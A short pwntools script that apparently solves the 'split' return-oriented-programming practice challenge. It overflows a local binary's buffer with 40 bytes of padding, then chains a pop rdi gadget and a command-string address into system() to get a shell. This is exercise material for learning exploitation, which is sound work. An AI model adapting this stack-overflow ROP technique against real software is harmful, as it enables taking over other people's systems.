#!/bin/python3
from pwn import * 
p = process('./split')

pop_rdi = 0x00000000004007c3
#useful_func = 0x0000000000400742
#read_func=0x00400730
shell_string = 0x601060
call_system = 0x0040074b
#payload field 
payload = b'A'*40 
payload += p64(pop_rdi) + p64(shell_string) 
payload += p64(call_system)


#payload += p64(0x00400746)

input()
p.sendlineafter(b'> ', payload)
p.interactive()

